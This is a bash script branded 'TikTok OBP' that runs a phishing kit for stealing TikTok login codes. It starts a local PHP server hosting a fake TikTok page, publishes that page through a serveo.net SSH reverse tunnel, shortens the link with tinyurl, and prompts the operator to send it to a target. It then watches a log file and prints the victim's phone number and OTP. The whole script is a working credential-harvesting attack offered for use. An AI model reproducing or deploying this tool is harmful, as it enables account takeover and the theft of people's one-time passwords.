#!/bin/bash

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}


banner() {

clear
echo
echo
echo "████████ ██ ██   ██ ████████  ██████  ██   ██       ██████  ██████  ██████  ";
echo "   ██    ██ ██  ██     ██    ██    ██ ██  ██       ██    ██ ██   ██ ██   ██ ";
echo "   ██    ██ █████      ██    ██    ██ █████  █████ ██    ██ ██████  ██████  ";
echo "   ██    ██ ██  ██     ██    ██    ██ ██  ██       ██    ██ ██   ██ ██      ";
echo "   ██    ██ ██   ██    ██     ██████  ██   ██       ██████  ██████  ██      ";
echo
echo "                                                 -: OTP Bypass Method :-  ";
echo
echo " ████████▀▀▀████             Author:- Basudev  "
echo " ████████────▀██                               "
echo " ████████──█▄──█             Insta:- @basudevrout2001                    "
echo " ███▀▀▀██──█████                                 "
echo " █▀──▄▄██──█████             Github:- https://github.com/basu021       "
echo " █──█████──█████                                   "
echo " █▄──▀▀▀──▄█████                                    "
echo " ███▄▄▄▄▄███████                                 "
echo


}


#update() {

#cd ..
#rm -rf tiktok-obp


#}

menu() {

echo
echo "[01] Start"
echo
echo "[02] Update"
echo
echo "[03] Uses"
echo
echo "[00] exit"
echo
echo
read -p $'\n[*] Choose an option: ' option

if [[ $option == 1 || $option == 01 ]]; then
server="tiktok"
start1

elif [[ $option == 2 || $option == 02 ]]; then
update

elif [[ $option == 3 || $option == 03 ]]; then
uses

elif [[ $option == 0 || $option == 00 ]]; then
exit 1

else
echo "[!] Invalid option!"
sleep 1
clear
menu

fi
}

catch_cred() {
##
account=$(grep -i 'username=IN' sites/tiktok/log.txt )
#IFS=$'\n'
password=$(grep -i 'otp' sites/tiktok/log.txt )
printf "[*] Number and country code: %s\n" $account
printf "[*] OTP: %s\n" $password
printf "[*] Waiting For Next Credentials, Press Ctrl + C to exit...\n"
rm -rf sites/tiktok/log.txt
checkfound
}


serverx() {
printf "[*] Starting php server...\n"
cd sites/tiktok && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "[*] Starting server...\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n[*] Send the direct link to target: %s \n' $send_link

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)

printf "\n"
checkfound

}

startx() {

if [[ -e sites/$server/log.txt ]]; then
rm -rf sites/$server/log.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '[*] Choose a Port (Default: %s ): ' $default_port
read port
port="${port:-${default_port}}"
serverx

}


start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "[01] Serveo.net \n"
printf "[02] Ngrok\n"
default_option_server="1"
read -p $'\n[*] Choose a Port Forwarding option: ' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf " [!] Invalid option!\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "[*] Waiting For Credentials, Press Ctrl + C to exit...\n"
while [ true ]; do

sleep 0.5
if [[ -e "sites/tiktok/log.txt" ]]; then
printf "\n[*] Credentials Found!\n"
catch_cred

rm -rf sites/tiktok/log.txt

fi

sleep 0.5


done

}

dependencies
banner
menu
